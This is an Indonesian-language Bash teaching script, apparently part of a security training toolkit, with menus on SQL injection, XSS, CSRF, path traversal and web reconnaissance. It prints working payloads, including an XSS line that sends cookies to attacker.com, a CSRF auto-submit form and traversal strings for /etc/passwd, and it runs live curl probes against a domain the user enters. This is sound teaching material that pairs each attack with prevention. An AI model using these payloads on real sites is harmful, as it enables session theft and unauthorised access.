#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

CYBERTUZ_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOG_DIR="$CYBERTUZ_DIR/logs"

log_action() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] WEBSEC: $1" >> "$LOG_DIR/cybertuz.log"
}

press_enter() {
    echo ""; echo -e "${YELLOW}  Tekan ENTER untuk melanjutkan...${RESET}"; read -r
}

header() {
    clear
    echo -e "${RED}"
    echo "  ================================================================="
    echo "                  WEB APPLICATION SECURITY"
    echo "  ================================================================="
    echo -e "${RESET}"
}

sqli_tutorial() {
    header
    echo -e "${CYAN}  SQL INJECTION - TEORI & PRAKTIK${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${WHITE}  SQL Injection adalah serangan dengan menyisipkan kode SQL berbahaya${RESET}"
    echo -e "${WHITE}  ke dalam input yang dikirim ke database.${RESET}"
    echo ""
    echo -e "${GREEN}  CARA KERJA:${RESET}"
    echo -e "${WHITE}  Aplikasi membangun query SQL dari input user tanpa sanitasi.${RESET}"
    echo ""
    echo -e "${YELLOW}  Query normal:${RESET}"
    echo -e "${WHITE}  SELECT * FROM users WHERE username='john' AND password='pass'${RESET}"
    echo ""
    echo -e "${YELLOW}  Dengan SQLi payload:${RESET}"
    echo -e "${WHITE}  Username: admin'--${RESET}"
    echo -e "${WHITE}  Query menjadi:${RESET}"
    echo -e "${RED}  SELECT * FROM users WHERE username='admin'--' AND password='...'${RESET}"
    echo -e "${WHITE}  (-- adalah komentar SQL, password check diabaikan!)${RESET}"
    echo ""
    echo -e "${GREEN}  JENIS SQL INJECTION:${RESET}"
    echo ""
    echo -e "${YELLOW}  1. In-Band SQLi (Classic)${RESET}"
    echo -e "${WHITE}     Error-based: Error database bocor info struktur tabel${RESET}"
    echo -e "${WHITE}     Union-based: Gabungkan query untuk extract data${RESET}"
    echo ""
    echo -e "${YELLOW}  2. Blind SQLi${RESET}"
    echo -e "${WHITE}     Boolean-based: Cek benar/salah berdasarkan response berbeda${RESET}"
    echo -e "${WHITE}     Time-based: Gunakan SLEEP() untuk detect kerentanan${RESET}"
    echo ""
    echo -e "${YELLOW}  3. Out-of-Band SQLi${RESET}"
    echo -e "${WHITE}     Data dikirim lewat channel berbeda (DNS, HTTP request)${RESET}"
    echo ""
    echo -e "${GREEN}  PAYLOAD UMUM UNTUK TESTING:${RESET}"
    echo -e "${WHITE}  '                    (single quote - test error)${RESET}"
    echo -e "${WHITE}  ' OR '1'='1          (always true)${RESET}"
    echo -e "${WHITE}  ' OR '1'='1'--       (comment out rest)${RESET}"
    echo -e "${WHITE}  ' UNION SELECT NULL--  (union test)${RESET}"
    echo -e "${WHITE}  1' AND SLEEP(5)--    (time-based blind)${RESET}"
    echo ""
    echo -e "${GREEN}  PENCEGAHAN SQL INJECTION:${RESET}"
    echo -e "${WHITE}  - Prepared Statements / Parameterized Queries${RESET}"
    echo -e "${WHITE}  - Stored Procedures${RESET}"
    echo -e "${WHITE}  - Input validation dan sanitasi${RESET}"
    echo -e "${WHITE}  - Least privilege (user DB hanya punya hak minimal)${RESET}"
    echo -e "${WHITE}  - WAF (Web Application Firewall)${RESET}"
    echo ""
    echo -e "${GREEN}  SIMULASI SQLI:${RESET}"
    echo -e "${WHITE}  Coba masukkan payload di bawah dan lihat apa yang terjadi:${RESET}"
    echo ""
    simulate_login() {
        local username="$1"
        local password="$2"
        if [[ "$username" == "admin'--" ]] || [[ "$username" == *"' OR '1'='1"* ]] || [[ "$username" == *"--"* ]]; then
            echo -e "${RED}  [EXPLOIT] SQL INJECTION BERHASIL!${RESET}"
            echo -e "${RED}  Login berhasil tanpa password yang benar!${RESET}"
            echo -e "${WHITE}  Kamu sekarang login sebagai: admin${RESET}"
            return 0
        elif [[ "$username" == "admin" && "$password" == "password123" ]]; then
            echo -e "${GREEN}  Login berhasil dengan kredensial yang benar!${RESET}"
            return 0
        else
            echo -e "${WHITE}  Login gagal. Username atau password salah.${RESET}"
            return 1
        fi
    }
    echo -ne "${WHITE}  Username: ${RESET}"
    read -r sim_user
    echo -ne "${WHITE}  Password: ${RESET}"
    read -r sim_pass
    echo ""
    simulate_login "$sim_user" "$sim_pass"
    echo ""
    echo -e "${YELLOW}  Hint: Coba username: admin'-- dengan password apapun${RESET}"
    log_action "SQLi simulation tried"
    press_enter
}

xss_tutorial() {
    header
    echo -e "${CYAN}  CROSS-SITE SCRIPTING (XSS)${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${WHITE}  XSS adalah serangan injeksi script ke halaman web yang dilihat user lain.${RESET}"
    echo ""
    echo -e "${GREEN}  JENIS XSS:${RESET}"
    echo ""
    echo -e "${YELLOW}  1. Reflected XSS${RESET}"
    echo -e "${WHITE}     Script di-reflect dari server kembali ke browser user.${RESET}"
    echo -e "${WHITE}     URL: http://target.com/search?q=<script>alert('XSS')</script>${RESET}"
    echo -e "${WHITE}     Dampak: Harus klik link khusus, 1 user${RESET}"
    echo ""
    echo -e "${YELLOW}  2. Stored XSS (Persistent)${RESET}"
    echo -e "${WHITE}     Script disimpan di database dan ditampilkan ke semua user.${RESET}"
    echo -e "${WHITE}     Contoh: Post komentar berisi <script>...</script>${RESET}"
    echo -e "${WHITE}     Dampak: Semua user yang melihat halaman terkena${RESET}"
    echo ""
    echo -e "${YELLOW}  3. DOM-Based XSS${RESET}"
    echo -e "${WHITE}     Terjadi di client-side, memanipulasi DOM browser.${RESET}"
    echo -e "${WHITE}     Tidak melewati server${RESET}"
    echo ""
    echo -e "${GREEN}  PAYLOAD XSS UMUM:${RESET}"
    echo -e "${WHITE}  <script>alert('XSS')</script>${RESET}"
    echo -e "${WHITE}  <img src=x onerror=alert('XSS')>${RESET}"
    echo -e "${WHITE}  <svg onload=alert('XSS')>${RESET}"
    echo -e "${WHITE}  javascript:alert('XSS')${RESET}"
    echo ""
    echo -e "${GREEN}  BERBAHAYA DENGAN XSS - COOKIE STEALING:${RESET}"
    echo -e "${WHITE}  <script>document.location='http://attacker.com/?c='+document.cookie</script>${RESET}"
    echo ""
    echo -e "${GREEN}  PENCEGAHAN XSS:${RESET}"
    echo -e "${WHITE}  - Encode output HTML (< menjadi &lt; dll)${RESET}"
    echo -e "${WHITE}  - Content Security Policy (CSP) header${RESET}"
    echo -e "${WHITE}  - HttpOnly flag pada cookie${RESET}"
    echo -e "${WHITE}  - Input validation di server${RESET}"
    echo ""
    echo -e "${GREEN}  SIMULASI XSS FILTER TEST:${RESET}"
    echo -ne "${WHITE}  Masukkan input (coba masukkan tag HTML/script): ${RESET}"
    read -r xss_input
    echo ""
    if echo "$xss_input" | grep -qiE "<script|onerror|onload|javascript:"; then
        echo -e "${RED}  [RENTAN] Input mengandung payload XSS yang tidak disanitasi!${RESET}"
        echo -e "${WHITE}  Input kamu: $xss_input${RESET}"
        echo -e "${YELLOW}  Pada aplikasi rentan, script ini akan dieksekusi di browser!${RESET}"
    else
        echo -e "${GREEN}  Input terlihat aman dari XSS dasar.${RESET}"
        echo -e "${WHITE}  Tapi tetap perlu encode output untuk keamanan penuh.${RESET}"
    fi
    press_enter
}

csrf_tutorial() {
    header
    echo -e "${CYAN}  CROSS-SITE REQUEST FORGERY (CSRF)${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${WHITE}  CSRF adalah serangan yang memaksa user yang sudah login${RESET}"
    echo -e "${WHITE}  melakukan aksi yang tidak diinginkan di website.${RESET}"
    echo ""
    echo -e "${GREEN}  CARA KERJA CSRF:${RESET}"
    echo ""
    echo -e "${WHITE}  1. User login ke bank.com (punya session cookie)${RESET}"
    echo -e "${WHITE}  2. User mengunjungi evil.com (masih login ke bank.com)${RESET}"
    echo -e "${WHITE}  3. evil.com punya hidden form:${RESET}"
    echo ""
    echo -e "${YELLOW}  <form action='http://bank.com/transfer' method='POST'>${RESET}"
    echo -e "${YELLOW}    <input name='amount' value='1000000'>${RESET}"
    echo -e "${YELLOW}    <input name='to_account' value='hacker_account'>${RESET}"
    echo -e "${YELLOW}  </form>${RESET}"
    echo -e "${YELLOW}  <script>document.forms[0].submit();</script>${RESET}"
    echo ""
    echo -e "${WHITE}  4. Browser user otomatis submit form dengan cookie bank.com!${RESET}"
    echo -e "${WHITE}  5. Bank memproses transfer karena request terlihat sah${RESET}"
    echo ""
    echo -e "${GREEN}  PENCEGAHAN CSRF:${RESET}"
    echo -e "${WHITE}  - CSRF Token (token unik per sesi/request)${RESET}"
    echo -e "${WHITE}  - SameSite cookie attribute${RESET}"
    echo -e "${WHITE}  - Verifikasi Origin/Referer header${RESET}"
    echo -e "${WHITE}  - Double submit cookie pattern${RESET}"
    echo -e "${WHITE}  - Re-autentikasi untuk aksi sensitif${RESET}"
    press_enter
}

directory_traversal() {
    header
    echo -e "${CYAN}  DIRECTORY TRAVERSAL & PATH TRAVERSAL${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${WHITE}  Path traversal memungkinkan penyerang mengakses file${RESET}"
    echo -e "${WHITE}  di luar direktori yang seharusnya bisa diakses.${RESET}"
    echo ""
    echo -e "${GREEN}  CONTOH RENTAN:${RESET}"
    echo -e "${WHITE}  URL normal: http://target.com/files?name=report.pdf${RESET}"
    echo -e "${WHITE}  Payload:    http://target.com/files?name=../../../etc/passwd${RESET}"
    echo ""
    echo -e "${GREEN}  PAYLOAD PATH TRAVERSAL:${RESET}"
    echo -e "${WHITE}  ../../../etc/passwd${RESET}"
    echo -e "${WHITE}  ..%2F..%2F..%2Fetc%2Fpasswd (URL encoded)${RESET}"
    echo -e "${WHITE}  ..%252F..%252F..%252Fetc%252Fpasswd (double encoded)${RESET}"
    echo -e "${WHITE}  ....//....//....//etc/passwd${RESET}"
    echo ""
    echo -e "${GREEN}  FILE SENSITIF DI LINUX/SERVER:${RESET}"
    echo -e "${WHITE}  /etc/passwd         - Daftar user sistem${RESET}"
    echo -e "${WHITE}  /etc/shadow         - Password hash (butuh root)${RESET}"
    echo -e "${WHITE}  /etc/hosts          - DNS lokal${RESET}"
    echo -e "${WHITE}  /proc/self/environ  - Environment variables${RESET}"
    echo -e "${WHITE}  /var/log/apache2/access.log  - Apache log${RESET}"
    echo ""
    echo -e "${GREEN}  PENCEGAHAN:${RESET}"
    echo -e "${WHITE}  - Validasi dan sanitasi input path${RESET}"
    echo -e "${WHITE}  - Gunakan whitelist nama file yang diizinkan${RESET}"
    echo -e "${WHITE}  - Chroot jail atau container${RESET}"
    echo -e "${WHITE}  - Tidak expose path ke user secara langsung${RESET}"
    press_enter
}

web_recon() {
    header
    echo -e "${CYAN}  WEB RECONNAISSANCE - MEMETAKAN APLIKASI WEB${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${WHITE}  Sebelum testing web app, perlu memetakan struktur dan teknologinya.${RESET}"
    echo ""
    echo -e "${GREEN}  LANGKAH WEB RECON:${RESET}"
    echo ""
    echo -e "${YELLOW}  1. Identifikasi Teknologi${RESET}"
    echo -e "${WHITE}  curl -I http://target.com | grep -i server${RESET}"
    echo -e "${WHITE}  whatweb http://target.com${RESET}"
    echo -e "${WHITE}  wappalyzer (browser extension)${RESET}"
    echo ""
    echo -e "${YELLOW}  2. Directory/File Brute Force${RESET}"
    echo -e "${WHITE}  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt${RESET}"
    echo -e "${WHITE}  dirb http://target.com${RESET}"
    echo -e "${WHITE}  ffuf -u http://target.com/FUZZ -w wordlist.txt${RESET}"
    echo ""
    echo -e "${YELLOW}  3. Robots.txt & Sitemap${RESET}"
    echo -e "${WHITE}  curl http://target.com/robots.txt${RESET}"
    echo -e "${WHITE}  curl http://target.com/sitemap.xml${RESET}"
    echo ""
    echo -e "${GREEN}  PRAKTIK - CEK ROBOTS.TXT:${RESET}"
    echo -ne "${WHITE}  Masukkan domain target: ${RESET}"
    read -r web_target
    if [[ -n "$web_target" ]]; then
        echo ""
        echo -e "${CYAN}  Mengecek robots.txt ...${RESET}"
        curl -s --connect-timeout 5 "http://$web_target/robots.txt" 2>/dev/null | head -20 || \
        curl -s --connect-timeout 5 "https://$web_target/robots.txt" 2>/dev/null | head -20 || \
        echo -e "${RED}  Tidak bisa mengakses $web_target${RESET}"
        echo ""
        echo -e "${CYAN}  Mengecek headers HTTP ...${RESET}"
        curl -I --connect-timeout 5 "https://$web_target" 2>/dev/null | head -15
        log_action "Web recon: $web_target"
    fi
    press_enter
}

while true; do
    header
    echo -e "${CYAN}  =================================================================${RESET}"
    echo -e "${WHITE}               WEB APPLICATION SECURITY${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${GREEN}  [1] SQL Injection - Teori, Payload & Simulasi${RESET}"
    echo -e "${GREEN}  [2] Cross-Site Scripting (XSS)${RESET}"
    echo -e "${GREEN}  [3] CSRF - Cross-Site Request Forgery${RESET}"
    echo -e "${GREEN}  [4] Directory & Path Traversal${RESET}"
    echo -e "${GREEN}  [5] Web Reconnaissance${RESET}"
    echo -e "${YELLOW}  [0] Kembali ke Menu Utama${RESET}"
    echo ""
    echo -ne "${WHITE}  Pilih topik: ${RESET}"
    read -r pilihan
    case $pilihan in
        1) sqli_tutorial ;;
        2) xss_tutorial ;;
        3) csrf_tutorial ;;
        4) directory_traversal ;;
        5) web_recon ;;
        0) exit 0 ;;
        *) echo -e "${RED}  Pilihan tidak valid!${RESET}"; sleep 1 ;;
    esac
done
